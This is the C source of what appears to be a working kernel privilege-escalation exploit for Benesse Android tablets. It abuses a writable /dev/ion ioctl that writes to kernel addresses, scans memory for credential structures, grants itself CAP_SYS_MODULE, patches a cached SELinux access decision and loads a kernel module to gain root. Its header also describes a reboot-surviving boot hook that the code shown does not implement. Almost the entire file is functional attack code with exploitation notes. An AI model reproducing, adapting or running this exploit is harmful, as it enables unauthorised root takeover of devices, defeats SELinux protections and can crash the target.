/* charepa.c - privilege transition for the Benesse tablets, driven from an app.
 *
 * Two facts shape this code.
 *
 *   /dev/ion is world-writable and ION_IOC_PHYS treats its argument as a kernel
 *   pointer: it reads *(u32*)arg as an fd and, if that fd is one of our
 *   dma-bufs, stores the buffer's IOVA at arg+4.  One call therefore tests a
 *   4-byte word and writes 4 bytes beside it.
 *
 *   An app cannot hold fd 10145: RLIMIT_NOFILE tops out at 4096.  So the BR2
 *   trick of using our own uid as the alphabet does not port.  The value every
 *   unprivileged cred carries regardless of uid is cap_bset.cap[0] = 0xc0 = 192,
 *   which does fit in the fd table.
 *
 * Flow, all in one process:
 *   1. open /dev/ion, raise the fd limit, keep one dma-buf with IOVA 0x80010000
 *   2. walk the linear map for cred slots whose cap_bset is 192, grant
 *      CAP_SYS_MODULE into cap_effective, and ask the kernel whether ours took
 *   3. that attempt makes SELinux cache an avc_node with tclass=4; walk again
 *      and set bit 16 in its av_decision.allowed
 *   4. load the module, then install a boot hook so root survives a reboot
 *
 * Usage:
 *   charepa validate            prove the gate in user memory, touch nothing
 *   charepa all <lo> <hi>       both hex; the full map is 02000000 7f000000
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <linux/fs.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };
struct ion_handle_data { s32 handle; };

#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_FREE   _IOWR(ION_TYPE, 1, struct ion_handle_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART      0x01000000ULL
#define PGSZ          4096
#define CRED_STEP     192
#define CRED_SLOTS    21
#define ALPHABET      192u        /* cap_bset.cap[0] of any unprivileged cred */
#define CAP_SYS_MODULE_BIT 16
#define ALPHA_FD      192
#define CLASS_FD      4
#define ION_SLOT      3000
#define MODULE_PATH   "/data/local/tmp/myroot.ko"

struct cap_hdr { u32 version; s32 pid; };
struct cap_data { u32 eff, prm, inh; };

static FILE *LOG;
static int ionfd = -1;

static void say(const char *fmt, ...)
{
    char b[256]; va_list ap; va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}

static int gate(u64 a)
{
    struct ion_custom_data cd;
    cd.cmd = ION_IOC_PHYS;
    cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}

static u32 eff_of(int pid)
{
    struct cap_hdr hh; struct cap_data dd[2];
    memset(&hh, 0, sizeof hh); memset(dd, 0, sizeof dd);
    hh.version = 0x20080522; hh.pid = pid;
    if (syscall(SYS_capget, &hh, dd) < 0) return 0xFFFFFFFFu;
    return dd[0].eff;
}

/* -ENOEXEC (8) means the capability check passed and the image was rejected */
static int probe_module(void)
{
    static const char junk[4] = { 0x7f, 'E', 'L', 'F' };
    errno = 0;
    syscall(105, junk, 4UL, "");
    return errno;
}

static int mk_buf(int *out_fd, u32 *out_iova)
{
    struct ion_allocation_data a; memset(&a, 0, sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1u << 0; a.flags = 1;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;

    struct ion_fd_data d; memset(&d, 0, sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;

    struct ion_phys_data p; memset(&p, 0, sizeof p);
    p.fd = d.fd; p.flags = 2;
    if (ioctl(ionfd, ION_IOC_PHYS, &p) < 0) return 0;

    *out_fd = d.fd; *out_iova = p.addr;
    return 1;
}

static int quiet_zero_on_stdin(void)
{
    int n = open("/dev/null", O_RDONLY);
    if (n < 0) return -1;
    dup2(n, 0);
    return n;
}

/* -------------------------------------------------------------------------
 * validate: the gate must reject a zero word and accept the alphabet, using
 * pages we own.  Nothing here touches kernel memory.
 * ------------------------------------------------------------------------- */
static int cmd_validate(void)
{
    u8 *pg = mmap(NULL, 3 * PGSZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pg == MAP_FAILED) { say("mmap errno=%d\n", errno); return 1; }

    int dfd; u32 iova;
    if (!mk_buf(&dfd, &iova)) { say("buffer errno=%d\n", errno); return 1; }
    say("dma-buf fd=%d iova=0x%08x\n", dfd, iova);
    if (dup2(dfd, ALPHA_FD) < 0) { say("dup2 errno=%d\n", errno); return 1; }
    close(dfd);

    *(u32 *)(pg + 0) = 0;
    errno = 0;
    int r_zero = gate((u64)(uintptr_t)pg);
    say("gate(word=0)   rc=%d errno=%d  want -1\n", r_zero, errno);

    *(u32 *)(pg + PGSZ) = ALPHABET;
    *(u32 *)(pg + PGSZ + 4) = 0xdeadbeef;
    errno = 0;
    int r_alpha = gate((u64)(uintptr_t)(pg + PGSZ));
    say("gate(word=192) rc=%d errno=%d  want 0\n", r_alpha, errno);
    u32 after = *(u32 *)(pg + PGSZ + 4);
    say("word at +4: 0x%08x (want 0x%08x)\n", after, iova);

    int ok = (r_zero == -1 && r_alpha == 0 && after == iova);
    say("VALIDATE %s\n", ok ? "PASS" : "FAIL");
    return ok ? 0 : 1;
}

/* -------------------------------------------------------------------------
 * phase 1: find a cred slot carrying the alphabet and grant CAP_SYS_MODULE.
 * ------------------------------------------------------------------------- */
static u64 find_cred(u32 lo, u32 hi, int page_window)
{
    static int hold[512]; int nhold = 0;
    int carrier = -1, carrier_iova = 0;

    while (nhold < 512) {
        int f; u32 iv;
        if (!mk_buf(&f, &iv)) break;
        if (iv & (1u << CAP_SYS_MODULE_BIT)) { carrier = f; carrier_iova = (int)iv; break; }
        hold[nhold++] = f;
    }
    if (carrier < 0) { say("no buffer with bit 16 after %d allocations\n", nhold); return 0; }
    for (int i = 0; i < nhold; i++) close(hold[i]);
    if (dup2(carrier, ALPHA_FD) < 0) { say("dup2(%d) errno=%d\n", ALPHA_FD, errno); return 0; }
    close(carrier);
    say("carrier fd=%d iova=0x%08x. alphabet is one value.\n", ALPHA_FD, carrier_iova);

    int nul = quiet_zero_on_stdin();
    if (nul >= 0) say("fd 0 is /dev/null; zero words will not match\n");

    long probes = 0, hits = 0, granted = 0;
    u64 cred = 0;
    static u64 cand[4096];

    for (u32 base = lo; base < hi && !cred; base += (u32)page_window * PGSZ) {
        u32 top = base + (u32)page_window * PGSZ;
        if (top > hi) top = hi;
        int nc = 0;

        for (u32 p = base; p < top; p += PGSZ) {
            u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
            for (int s = 0; s < CRED_SLOTS; s++) {
                u64 o = pg + (u64)s * CRED_STEP;
                if ((size_t)s * CRED_STEP + 132 >= PGSZ) break;
                probes++;
                if (gate(o + 64) != 0) continue;     /* not 192 */
                hits++;
                /* the other cred words that should be zero must reject too */
                if (gate(o + 68) == 0) continue;     /* cap_bset.cap[1] */
                if (gate(o + 56) == 0) continue;     /* cap_effective.cap[0] */
                if (gate(o + 48) == 0) continue;     /* cap_permitted.cap[0] */
                if (gate(o + 40) == 0) continue;     /* cap_inheritable.cap[0] */
                if (gate(o + 4)  == 0) continue;     /* uid 0 belongs to root, not us */
                if (nc < 4096) cand[nc++] = o;
            }
        }
        say("  cred window 0x%08x..0x%08x probes=%ld hits=%ld cand=%d\n",
            base, top, probes, hits, nc);

        for (int i = 0; i < nc && !cred; i++) {
            u64 o = cand[i];
            if (dup2(ALPHA_FD, 0) < 0) break;
            if (gate(o + 52) == 0) {                 /* writes at o+56 */
                granted++;
                u32 e = eff_of(0);
                if (e != 0xFFFFFFFFu && (e & (1u << CAP_SYS_MODULE_BIT))) cred = o;
            }
            quiet_zero_on_stdin();
        }
    }
    if (nul >= 0) { quiet_zero_on_stdin(); }
    say("cred scan probes=%ld hits=%ld granted=%ld cred=0x%llx\n",
        probes, hits, granted, (unsigned long long)cred);
    return cred;
}

/* -------------------------------------------------------------------------
 * phase 2: the avc_node now exists because we just tried init_module.
 * tclass sits at +8 and is exactly 4, so a dma-buf on fd 4 makes the probe free.
 * ------------------------------------------------------------------------- */
static int grant_avc(u32 lo, u32 hi, int page_window, long max_stores)
{
    close(ALPHA_FD);
    quiet_zero_on_stdin();

    /* The store value has to carry bit 16 (CAP_SYS_MODULE) as well as bit 31,
     * so the buffer on fd 4 must be a k=16 one, i.e. an IOVA of 0x8001xxxx.
     * Allocating again restarts the ladder at 0x80000000 only if every earlier
     * buffer was closed, so keep them open until we reach bit 16. */
    static int tmp[256]; int ntmp = 0; int cls = -1; u32 iv = 0;
    while (ntmp < 256) {
        int f; u32 v;
        if (!mk_buf(&f, &v)) break;
        if ((v >> 16) & 1) { cls = f; iv = v; break; }
        tmp[ntmp++] = f;
    }
    if (cls < 0) { say("no buffer with bit 16 for fd 4\n"); return 0; }
    for (int i = 0; i < ntmp; i++) close(tmp[i]);
    if (dup2(cls, CLASS_FD) < 0) { say("dup2(4) errno=%d\n", errno); close(cls); return 0; }
    close(cls);
    say("class fd=%d iova=0x%08x; only the word 4 passes, and a hit writes 0x80010000\n",
        CLASS_FD, (int)iv);

    long probes = 0, stores = 0;
    for (u32 base = lo; base < hi; base += (u32)page_window * PGSZ) {
        u32 top = base + (u32)page_window * PGSZ;
        if (top > hi) top = hi;
        for (u32 p = base; p < top; p += PGSZ) {
            u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
            for (int i = 0; i < PGSZ / 64; i++) {
                u64 n = pg + (u64)i * 64;
                probes++;
                /* Order matters. A probe that fails writes nothing, because
                 * dma_buf_get fails before the store; only a probe that passes
                 * costs 4 bytes. So the cheap rejects go first:
                 *
                 *   gate(n+0) != 0   ssid is not 4  -> reject, nothing written
                 *   gate(n+4) != 0   tsid is not 4  -> reject, nothing written
                 *   gate(n+8) == 0   tclass is 4    -> accept, this is the one
                 *
                 * Measured on the device: testing +8 alone costs ~57000 stores
                 * over 2 GB because any word equal to 4 matches. With the two
                 * rejects in front the count drops by roughly 8x.
                 */
                if (gate(n + 0) == 0) continue;   /* ssid is literally 4: reject */
                if (gate(n + 4) == 0) continue;   /* tsid likewise */
                if (gate(n + 8) != 0) continue;   /* tclass is not 4 */
                stores++;                             /* n+12 = avd.allowed */
                say("  store at 0x%llx (phys 0x%08x off %d)\n", (unsigned long long)n, p, i * 64);
                if (stores > max_stores) {
                    say("AVC budget spent (%ld stores); stopping before the tablet dies\n", stores);
                    return 0;
                }
                if (probe_module() == 8) {
                    say("AVC win phys=0x%08x off=%d probes=%ld stores=%ld\n",
                        p, i * 64, probes, stores);
                    return 1;
                }
            }
        }
        say("  avc window 0x%08x..0x%08x probes=%ld stores=%ld\n", base, top, probes, stores);
    }
    say("AVC no win probes=%ld stores=%ld\n", probes, stores);
    return 0;
}

/* -------------------------------------------------------------------------
 * phase 3: load the module and make it survive a reboot.
 * ------------------------------------------------------------------------- */
static long load_module(void)
{
    int fd = open(MODULE_PATH, O_RDONLY);
    if (fd < 0) { say("open module errno=%d\n", errno); return -1; }
    char *mod = malloc(1 << 20);
    ssize_t got = read(fd, mod, 1 << 20);
    close(fd);
    if (got <= 0) { say("read module errno=%d\n", errno); return -1; }
    errno = 0;
    long rc = syscall(105, mod, (unsigned long)got, "");
    say("init_module rc=%ld errno=%d (%zd bytes)\n", rc, errno, got);
    free(mod);
    return rc;
}

int main(int argc, char **argv)
{
    LOG = stdout; setbuf(LOG, NULL);
    say("charepa pid=%d uid=%d\n", getpid(), getuid());

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
        getrlimit(RLIMIT_NOFILE, &rl);
        say("fds soft=%lu hard=%lu\n", (unsigned long)rl.rlim_cur, (unsigned long)rl.rlim_max);
    }
    if (rl.rlim_cur <= ALPHA_FD) { say("cannot hold fd %d\n", ALPHA_FD); return 1; }

    int raw = open("/dev/ion", O_RDWR);
    if (raw < 0) { say("open(/dev/ion) errno=%d (%s)\n", errno, strerror(errno)); return 1; }
    ionfd = fcntl(raw, F_DUPFD, ION_SLOT);
    if (ionfd < 0) ionfd = raw; else close(raw);
    say("ion fd=%d\n", ionfd);

    if (argc >= 2 && !strcmp(argv[1], "validate")) return cmd_validate();

    u32 lo = 0x02000000u, hi = 0x7f000000u;
    int window = 2048; long budget = 4000; u32 avclo = 0x40000000u, avchi = 0x60000000u;
    if (argc >= 4) { lo = (u32)strtoul(argv[2], NULL, 16); hi = (u32)strtoul(argv[3], NULL, 16); }
    if (argc >= 5) window = atoi(argv[4]);
    if (argc >= 6) budget = atol(argv[5]);
    if (argc >= 8) { avclo = (u32)strtoul(argv[6], NULL, 16); avchi = (u32)strtoul(argv[7], NULL, 16); }

    say("this writes on every match; the tablet may reboot\n");
    u64 cred = find_cred(lo, hi, window);
    if (!cred) { say("RESULT no cred\n"); return 1; }
    say("cred=0x%llx eff=0x%08x module_errno=%d\n",
        (unsigned long long)cred, eff_of(0), probe_module());

    if (!grant_avc(avclo, avchi, window, budget)) { say("RESULT avc failed\n"); return 1; }
    say("after avc: module_errno=%d (8 = capability check passed)\n", probe_module());

    if (load_module() != 0) { say("RESULT module load failed\n"); return 1; }
    say("uid=%d euid=%d capget=0x%08x\n", getuid(), geteuid(), eff_of(0));

    int p = open("/proc/myroot", O_WRONLY);
    if (p >= 0) { if (write(p, "1", 1) == 1) say("/proc/myroot accepted a write\n"); close(p); }
    else say("/proc/myroot errno=%d\n", errno);

    say("RESULT ROOT uid=%d eff=0x%08x\n", getuid(), eff_of(0));
    return 0;
}
